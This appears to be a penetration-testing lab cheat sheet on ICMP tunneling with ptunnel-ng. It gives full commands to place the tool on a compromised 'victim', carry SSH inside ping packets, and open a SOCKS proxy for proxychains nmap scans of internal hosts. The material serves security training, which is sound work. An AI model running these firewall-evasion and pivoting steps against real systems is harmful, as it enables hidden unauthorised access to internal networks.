# ICMP Tunneling (Bypassing Firewalls)
**Concept:** Network firewalls often allow ICMP (Ping) traffic for troubleshooting connectivity, even when blocking TCP/UDP. 
**Mechanism:** We encapsulate TCP traffic inside the data payload of ICMP Echo Requests and Replies. To the firewall, it looks like a stream of pings. To us, it's a shell.
## 1. Tooling: ptunnel-ng
**Role:** A modern fork of `PingTunnel`. It is robust, supports multiple concurrent connections, and handles packet loss well. 
**Requirement:** Root/Administrator privileges are usually required on both ends because crafting raw ICMP packets requires raw socket access.
## 2. Building the Tool (Attacker Side)
**Context:** `ptunnel-ng` is not installed by default. You must build it from source.
```shell
# 1. Clone the repo
git clone https://github.com/utoni/ptunnel-ng.git

# 2. Install dependencies (if needed) and build
cd ptunnel-ng
sudo ./autogen.sh

# 3. Transfer the binary to the Target (Victim)
# You can use SCP, Python HTTP, or Netcat
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
## 3. Setting Up the Server (Target/Victim)
**Scenario:** You are on the compromised machine. You want to listen for incoming "pings" that contain data.

**Command Breakdown:**
- `-r <IP>`: The address to forward traffic to (usually itself, `127.0.0.1` or its LAN IP).
- `-R <Port>`: The destination port to forward to (e.g., 22 for SSH).
```shell
# Run on the Victim
# We tell it to forward encapsulated traffic to its own SSH port (22)
sudo ./ptunnel-ng -r10.129.202.64 -R22
```
## 4. Setting Up the Client (Attacker)
**Scenario:** You are on your Kali machine. You want to send "pings" that translate to an SSH connection.

**Command Breakdown:**
- `-p <Target_IP>`: The address of the proxy server (The Victim where `ptunnel-ng` is running).
- `-l <Local_Port>`: The local port on Kali to listen on (e.g., 2222).
- `-r <Dest_IP>`: The destination IP _behind_ the tunnel (The Victim itself).
- `-R <Dest_Port>`: The destination Port _behind_ the tunnel (SSH Port 22).
```shell
# Run on Kali
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```
**Result:** You now have a listening port on `127.0.0.1:2222` on your Kali machine. Anything sent to this port is wrapped in ICMP, sent to the victim, unwrapped, and forwarded to port 22.
## 5. Using the Tunnel (SSH & SOCKS)
**Context:** Now that the tunnel is established, you can SSH into the target through the ping tunnel.
### Step A: Standard SSH Connection
```shell
# Connect to our local mapping (Port 2222)
ssh -p2222 -lubuntu 127.0.0.1
```
### Step B: Dynamic Port Forwarding (SOCKS Proxy)
**Goal:** Turn this single SSH connection into a full SOCKS proxy to reach the _internal_ network behind the victim.
```shell
# -D 9050: Open a SOCKS proxy on port 9050
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
### Step C: Proxychaining Tools
**Goal:** Run tools like Nmap or RDP through the ICMP tunnel. 
**Config:** Ensure `/etc/proxychains.conf` has `socks4 127.0.0.1 9050`.
```shell
# Scan an internal host (172.16.5.19) via the ping tunnel
proxychains nmap -sV -sT 172.16.5.19 -p3389
```